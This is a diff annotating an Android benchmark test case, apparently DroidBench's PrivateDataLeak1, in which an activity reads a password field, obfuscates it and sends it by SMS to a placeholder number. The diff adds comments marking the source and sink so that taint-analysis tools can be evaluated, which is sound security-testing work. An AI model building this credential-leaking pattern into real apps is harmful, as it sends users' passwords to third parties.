@@ -7,7 +7,19 @@ import android.util.Log;
 import android.view.View;
 import android.widget.EditText;
 import de.ecspride.data.User;
-
+/**
+ * @testcase_name PrivateDataLeak1
+ * @version 0.1
+ * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
+ * @author_mail siegfried.rasthofer@cased.de
+ * 
+ * @description A value from a password field is obfuscated and sent via sms.
+ * @dataflow source -> pwd -> user.pwd.password -> password -> obfuscatedUsername -> message -> sink
+ * @number_of_leaks 1
+ * @challenges the analysis has to treat the value of password fields as source,
+ *  handle callbacks defined in the layout xml and support taint tracking in
+ *  String/char transformations
+ */
 public class PrivateDateLeakage extends Activity {
 	private User user = null;
 	
@@ -24,7 +36,7 @@ public class PrivateDateLeakage extends Activity {
 		EditText passwordText = (EditText)findViewById(R.id.password);
 		
 		String uname = usernameText.toString();
-		String pwd = passwordText.toString();
+		String pwd = passwordText.toString(); //source
 		
 		user = new User(uname, pwd);
 	}
@@ -38,8 +50,8 @@ public class PrivateDateLeakage extends Activity {
 			
 			String message = "User: " + user.getUsername() + " | Pwd: " + obfuscatedUsername;
 			SmsManager smsmanager = SmsManager.getDefault();
-			Log.i("TEST", "sendSMS");
-			smsmanager.sendTextMessage("+49 1234", null, message, null, null);
+			Log.i("TEST", "sendSMS"); //sink
+			smsmanager.sendTextMessage("+49 1234", null, message, null, null); //sink, leak
 		}
 	}
 	
